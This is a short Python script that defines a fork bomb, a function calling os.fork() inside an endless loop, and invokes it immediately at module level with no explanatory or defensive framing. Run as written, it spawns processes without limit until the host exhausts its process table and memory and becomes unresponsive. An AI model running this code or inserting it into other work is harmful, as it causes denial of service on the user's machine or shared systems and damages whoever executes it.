import os

def fork_bomb():
    while True:
        os.fork()

fork_bomb()
